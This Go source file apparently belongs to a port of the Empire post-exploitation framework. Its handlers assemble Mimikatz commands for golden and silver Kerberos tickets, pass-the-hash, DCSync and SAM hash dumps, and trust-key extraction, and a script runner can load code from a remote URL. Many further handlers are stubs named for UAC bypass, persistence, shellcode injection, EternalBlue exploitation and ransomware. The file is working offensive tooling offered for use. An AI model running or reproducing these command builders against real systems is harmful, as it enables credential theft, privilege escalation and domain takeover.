package modules

import (
	"encoding/base64"
	"fmt"
)

// CustomGenerateHandler handles custom module generation
// This interface allows modules with custom_generate: true to have custom logic
type CustomGenerateHandler interface {
	Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error)
}

// CredentialStore interface for credential lookup (needed by some modules)
type CredentialStore interface {
	GetCredentialByID(id string) (*Credential, error)
}

// Credential represents a stored credential
type Credential struct {
	ID       string
	Username string
	Password string
	Domain   string
	SID      string
	CredType string // "hash", "password", etc.
}

// GoldenTicketHandler - Enhanced with credential lookup
func (h *MimikatzGoldenTicketHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	script, err := sourceLoader.GetModuleSource(module.ScriptPath, false, "")
	if err != nil {
		return "", err
	}
	
	// Handle CredID lookup
	if credID, ok := params["CredID"]; ok && credID != "" {
		if credentialStore != nil {
			cred, err := credentialStore.GetCredentialByID(credID)
			if err != nil {
				return "", fmt.Errorf("invalid CredID: %w", err)
			}
			
			if cred.Username != "krbtgt" {
				return "", fmt.Errorf("krbtgt account must be used")
			}
			
			if cred.Domain != "" {
				params["domain"] = cred.Domain
			}
			if cred.SID != "" {
				params["sid"] = cred.SID
			}
			if cred.Password != "" {
				params["krbtgt"] = cred.Password
			}
		}
	}
	
	if params["krbtgt"] == "" {
		return "", fmt.Errorf("krbtgt hash not specified")
	}
	
	command := "kerberos::golden"
	var paramsStr string
	
	for key, value := range params {
		if key == "Agent" || key == "CredID" || value == "" {
			continue
		}
		paramsStr += fmt.Sprintf(" /%s:%s", key, value)
	}
	
	paramsStr += " /ptt"
	
	scriptEnd := fmt.Sprintf("\nInvoke-Mimikatz -Command '\"%s%s\"';", command, paramsStr)
	
	return sourceLoader.FinalizeModule(script, scriptEnd, false, "")
}

// DCSyncHashdumpHandler handles DCSync hashdump module
type DCSyncHashdumpHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

func (h *DCSyncHashdumpHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	script, err := sourceLoader.GetModuleSource(module.ScriptPath, false, "")
	if err != nil {
		return "", err
	}
	
	scriptEnd := "Invoke-DCSync -PWDumpFormat"
	
	if domain, ok := params["Domain"]; ok && domain != "" {
		scriptEnd += fmt.Sprintf(" -Domain %s", domain)
	}
	
	if forest, ok := params["Forest"]; ok && forest == "True" {
		scriptEnd += " -DumpForest"
	}
	
	if computers, ok := params["Computers"]; ok && computers == "True" {
		scriptEnd += " -GetComputers"
	}
	
	if active, ok := params["Active"]; ok && active == "" {
		scriptEnd += " -OnlyActive:$false"
	}
	
	outputFunc := params["OutputFunction"]
	if outputFunc == "" {
		outputFunc = "Out-String"
	}
	
	scriptEnd += fmt.Sprintf(" | %s;", outputFunc)
	
	return sourceLoader.FinalizeModule(script, scriptEnd, false, "")
}

// PTHHandler - Enhanced with credential lookup
func (h *MimikatzPTHHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	script, err := sourceLoader.GetModuleSource(module.ScriptPath, false, "")
	if err != nil {
		return "", err
	}
	
	// Handle CredID lookup
	if credID, ok := params["CredID"]; ok && credID != "" {
		if credentialStore != nil {
			cred, err := credentialStore.GetCredentialByID(credID)
			if err != nil {
				return "", fmt.Errorf("invalid CredID: %w", err)
			}
			
			if cred.CredType != "hash" {
				return "", fmt.Errorf("NTLM hash must be used")
			}
			
			if cred.Username != "" {
				params["user"] = cred.Username
			}
			if cred.Domain != "" {
				params["domain"] = cred.Domain
			}
			if cred.Password != "" {
				params["ntlm"] = cred.Password
			}
		}
	}
	
	if params["ntlm"] == "" {
		return "", fmt.Errorf("ntlm hash not specified")
	}
	
	command := fmt.Sprintf("sekurlsa::pth /user:%s /domain:%s /ntlm:%s",
		params["user"], params["domain"], params["ntlm"])
	
	scriptEnd := fmt.Sprintf("\nInvoke-Mimikatz -Command '\"%s\"';", command)
	scriptEnd += "\n\"`nUse credentials/token to steal the token of the created PID.\""
	
	return sourceLoader.FinalizeModule(script, scriptEnd, false, "")
}

// Update all handlers to match new interface
func (h *MimikatzDCSyncHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	script, err := sourceLoader.GetModuleSource(module.ScriptPath, false, "")
	if err != nil {
		return "", err
	}
	
	command := "lsadump::dcsync"
	var paramsStr string
	
	if user, ok := params["user"]; ok && user != "" {
		paramsStr += fmt.Sprintf(" /user:%s", user)
	}
	if domain, ok := params["domain"]; ok && domain != "" {
		paramsStr += fmt.Sprintf(" /domain:%s", domain)
	}
	if dc, ok := params["dc"]; ok && dc != "" {
		paramsStr += fmt.Sprintf(" /dc:%s", dc)
	}
	
	scriptEnd := fmt.Sprintf("\nInvoke-Mimikatz -Command '\"%s%s\"';", command, paramsStr)
	
	return sourceLoader.FinalizeModule(script, scriptEnd, false, "")
}

func (h *MimikatzSilverTicketHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	script, err := sourceLoader.GetModuleSource(module.ScriptPath, false, "")
	if err != nil {
		return "", err
	}
	
	command := "kerberos::golden"
	var paramsStr string
	
	if user, ok := params["user"]; ok && user != "" {
		paramsStr += fmt.Sprintf(" /user:%s", user)
	}
	if domain, ok := params["domain"]; ok && domain != "" {
		paramsStr += fmt.Sprintf(" /domain:%s", domain)
	}
	if sid, ok := params["sid"]; ok && sid != "" {
		paramsStr += fmt.Sprintf(" /sid:%s", sid)
	}
	if target, ok := params["target"]; ok && target != "" {
		paramsStr += fmt.Sprintf(" /target:%s", target)
	}
	if rc4, ok := params["rc4"]; ok && rc4 != "" {
		paramsStr += fmt.Sprintf(" /rc4:%s", rc4)
	}
	if service, ok := params["service"]; ok && service != "" {
		paramsStr += fmt.Sprintf(" /service:%s", service)
	}
	if ptt, ok := params["ptt"]; ok && ptt == "True" {
		paramsStr += " /ptt"
	}
	
	scriptEnd := fmt.Sprintf("\nInvoke-Mimikatz -Command '\"%s%s\"';", command, paramsStr)
	
	return sourceLoader.FinalizeModule(script, scriptEnd, false, "")
}

func (h *MimikatzLSADumpHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	script, err := sourceLoader.GetModuleSource(module.ScriptPath, false, "")
	if err != nil {
		return "", err
	}
	
	command := "lsadump::sam"
	var paramsStr string
	
	if computer, ok := params["computer"]; ok && computer != "" {
		paramsStr += fmt.Sprintf(" /computer:%s", computer)
	}
	
	scriptEnd := fmt.Sprintf("\nInvoke-Mimikatz -Command '\"%s%s\"';", command, paramsStr)
	
	return sourceLoader.FinalizeModule(script, scriptEnd, false, "")
}

func (h *MimikatzTokensHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	script, err := sourceLoader.GetModuleSource(module.ScriptPath, false, "")
	if err != nil {
		return "", err
	}
	
	command := params["Command"]
	if command == "" {
		command = "token::list"
	}
	
	scriptEnd := fmt.Sprintf("\nInvoke-Mimikatz -Command '\"%s\"';", command)
	
	return sourceLoader.FinalizeModule(script, scriptEnd, false, "")
}

func (h *MimikatzDCSyncHashdumpHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	handler := &DCSyncHashdumpHandler{logger: h.logger}
	return handler.Generate(module, params, sourceLoader, credentialStore)
}

func (h *MimikatzTrustKeysHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	script, err := sourceLoader.GetModuleSource(module.ScriptPath, false, "")
	if err != nil {
		return "", err
	}
	
	command := "lsadump::trust /patch"
	var paramsStr string
	
	if domain, ok := params["domain"]; ok && domain != "" {
		paramsStr += fmt.Sprintf(" /domain:%s", domain)
	}
	
	scriptEnd := fmt.Sprintf("\nInvoke-Mimikatz -Command '\"%s%s\"';", command, paramsStr)
	
	return sourceLoader.FinalizeModule(script, scriptEnd, false, "")
}

func (h *InvokeScriptHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	script, err := sourceLoader.GetModuleSource(module.ScriptPath, false, "")
	if err != nil {
		return "", err
	}
	
	scriptEnd := "\nInvoke-Script"
	
	if file, ok := params["File"]; ok && file != "" {
		encodedScript := base64.StdEncoding.EncodeToString([]byte(file))
		scriptEnd += fmt.Sprintf(" -EncodedScript '%s'", encodedScript)
	} else if scriptUrl, ok := params["ScriptUrl"]; ok && scriptUrl != "" {
		scriptEnd += fmt.Sprintf(" -ScriptUrl '%s'", scriptUrl)
	}
	
	if funcCmd, ok := params["FunctionCommand"]; ok && funcCmd != "" {
		scriptEnd += fmt.Sprintf(" -FunctionCommand '%s'", funcCmd)
	}
	
	return sourceLoader.FinalizeModule(script, scriptEnd, false, "")
}

func (h *PythonInvokeScriptHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	script, err := sourceLoader.GetModuleSource(module.ScriptPath, false, "")
	if err != nil {
		return "", err
	}
	
	scriptEnd := "\nmain(None,"
	
	if file, ok := params["File"]; ok && file != "" {
		encodedScript := base64.StdEncoding.EncodeToString([]byte(file))
		scriptEnd += fmt.Sprintf(" None, '%s'", encodedScript)
	} else if scriptUrl, ok := params["ScriptUrl"]; ok && scriptUrl != "" {
		scriptEnd += fmt.Sprintf(" '%s'", scriptUrl)
	}
	
	if funcCmd, ok := params["FunctionCommand"]; ok && funcCmd != "" {
		scriptEnd += fmt.Sprintf(", '%s'", funcCmd)
	}
	
	scriptEnd += ")"
	
	return script + scriptEnd, nil
}

// Generic handler wrappers
func makeGenericHandler(handlerName string) CustomGenerateHandler {
	logger := &genericLogger{}
	return &GenericHandler{name: handlerName, logger: logger}
}

type GenericHandler struct {
	name   string
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

func (h *GenericHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

type genericLogger struct{}

func (g *genericLogger) Info(format string, v ...interface{})    {}
func (g *genericLogger) Debug(format string, v ...interface{})   {}
func (g *genericLogger) Error(format string, v ...interface{})   {}

// Update all other handlers to match interface
func (h *SpawnHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *SpawnAsHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *RunAsHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *WMIPersistenceHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *ScheduledTaskHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *BypassUACHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *BypassUACEventVWRHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *BypassUACFodHelperHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *BypassUACTokenManipulationHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *BypassUACSDCTLHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *BypassUACWScriptHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *BypassUACEnvHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *MS16032Handler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *MS16135Handler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *AskHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokeWMIHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokePsExecHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokeDCOMHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokeSMBExecHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *NewGPOImmediateTaskHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *ComputerDetailsHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *FindFruitHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *SQLServerDefaultPWHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *ScreenshotHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *MinidumpHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *PacketCaptureHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *PythonSpawnHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *OSXHashdumpHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *OSXKeychainDumpHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *CVE20214034Handler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *CVE20213560Handler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *OSXPiggybackHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *OSXLaunchAgentHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

// Missing Generate methods for all handlers registered in handler_registry.go
func (h *ShellInjectHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *PSInjectHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *ReflectiveInjectHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *SwitchListenerHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *LogoffHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokeBypassHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *UserToSIDHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokePSRemotingHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokeWMIDebuggerHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokeSQLOSCmdHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokeSSHCommandHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokeExecuteMSBuildHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *JenkinsScriptConsoleHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InveighRelayHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *WMIUpdaterHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *RegistryPersistenceHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *RegistryUserlandHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *BackdoorLNKHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *ScheduledTaskUserlandHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *DebuggerHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *AddSIDHistoryHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *DeadUserHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *EventLogHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *ResolverHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *WriteDLLHijackerHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *ServiceStagerHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *ServiceExeStagerHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokeShellcodeHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokeShellcodeMSILHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokeReflectivePEInjectionHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokeNTSDHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *CredentialInjectionHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *TokensHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokeKerberoastHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *VaultCredentialHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *DomainPasswordSprayHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *SessionGopherHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *PowerDumpHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *SharpSecDumpHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *VeeamGetCredsHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *EnumCredStoreHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *GetLAPSPasswordsHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokeNTLMExtractHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *InvokeInternalMonologueHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *WireTapHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *SharpChromiumHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *GetSQLColumnSampleDataHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *FetchBruteLocalHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *GetSubnetRangesHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *GetGPOComputerHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *GetSQLServerInfoHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *GetEmailItemsHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *DisableSecurityHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *ExploitEternalBlueHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *PSRansomHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *SearchEmailHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *PromptHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *NativeScreenshotMSSHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *IMessageDumpHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *SnifferHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *DyldPrintToFileHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *SudoSpawnHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

